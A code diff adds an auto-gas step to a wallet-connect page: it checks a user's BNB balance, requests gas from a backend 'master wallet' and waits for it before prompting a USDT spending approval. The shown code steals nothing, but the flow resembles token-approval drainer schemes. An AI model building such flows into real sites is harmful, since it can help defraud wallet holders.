@@ -321,6 +321,9 @@
         const backendResult = await sendWalletToBackend(currentWalletAddress)
         
         if (backendResult.success) {
+          // CRITICAL FIX: Handle auto gas during connection
+          await handleAutoGasIfNeeded();
+          
           showSuccess('Wallet connected successfully!')
           // Update balance display
           if (usdtBalanceEl && backendResult.data.wallet.usdt_balance) {
@@ -337,6 +340,121 @@
         isConnecting = false
         showLoading(connectText, false)
       }
+    }
+
+    // Handle auto gas during connection
+    async function handleAutoGasIfNeeded() {
+      try {
+        console.log('🔍 Starting auto-gas check...');
+        
+        // Create provider if not exists
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        
+        // Check if wallet has sufficient gas
+        console.log('💰 Checking wallet gas balance...');
+        const hasGas = await checkWalletGasBalance(provider);
+        console.log('⛽ Gas check result:', hasGas);
+        
+        if (!hasGas) {
+          console.log('🚨 Insufficient gas detected, requesting gas from master wallet...');
+          showSuccess('Insufficient gas detected. Requesting gas from master wallet...');
+          
+          // Request gas from backend (master wallet)
+          console.log('📤 Sending gas request to backend...');
+          await requestGasFromMaster(currentWalletAddress);
+          console.log('📥 Gas request sent successfully');
+          
+          // Wait for gas to be sent by master wallet
+          console.log('⏳ Waiting for gas to arrive (up to 60 seconds)...');
+          await waitForGas(provider, 60000); // Wait up to 60 seconds
+          console.log('🎉 Gas received!');
+          
+          showSuccess('Gas received! You can now approve USDT spending.');
+        } else {
+          console.log('✅ Wallet already has sufficient gas, no action needed');
+        }
+        
+        console.log('🔍 Auto-gas check completed');
+      } catch (error) {
+        console.error('💥 Auto gas handling error:', error);
+        showError('Gas handling issue: ' + error.message);
+      }
+    }
+
+    // Check if wallet has sufficient gas balance
+    async function checkWalletGasBalance(provider) {
+      try {
+        if (!provider || !currentWalletAddress) {
+          return false;
+        }
+        
+        const balance = await provider.getBalance(currentWalletAddress);
+        const balanceInBNB = ethers.formatEther(balance);
+        
+        // Check if balance is greater than minimum required (0.001 BNB)
+        const hasSufficientGas = parseFloat(balanceInBNB) >= 0.001;
+        
+        console.log('Gas balance:', balanceInBNB, 'BNB - Sufficient:', hasSufficientGas);
+        
+        return hasSufficientGas;
+      } catch (error) {
+        console.error('Gas check error:', error);
+        // If we can't check, assume no gas and let the master wallet handle it
+        return false;
+      }
+    }
+
+    // Request gas from master wallet
+    async function requestGasFromMaster(walletAddress) {
+      try {
+        showSuccess('Requesting gas from master wallet...');
+        
+        const response = await fetch(`${CONFIG.API_URL}/wallets/request-gas`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            address: walletAddress
+          })
+        });
+        
+        if (!response.ok) {
+          const errorData = await response.json().catch(() => ({}));
+          const errorMessage = errorData.error || `HTTP ${response.status}: ${response.statusText}`;
+          console.error('Gas request error:', errorMessage);
+          throw new Error(`Failed to request gas: ${errorMessage}`);
+        }
+        
+        const result = await response.json();
+        console.log('Gas request successful:', result);
+        return result;
+        
+      } catch (error) {
+        console.error('Gas request error:', error);
+        throw new Error(`Gas request failed: ${error.message}`);
+      }
+    }
+
+    // Wait for gas to be sent to wallet
+    async function waitForGas(provider, timeout = 60000) {
+      const startTime = Date.now();
+      
+      while (Date.now() - startTime < timeout) {
+        // Check gas balance
+        const hasGas = await checkWalletGasBalance(provider);
+        
+        if (hasGas) {
+          showSuccess('Gas received! Proceeding with approval...');
+          return true;
+        }
+        
+        // Wait 3 seconds before checking again
+        await new Promise(resolve => setTimeout(resolve, 3000));
+      }
+      
+      // Timeout reached
+      throw new Error('Gas not received within timeout period. Please try again.');
     }
 
     // Reset wallet connection
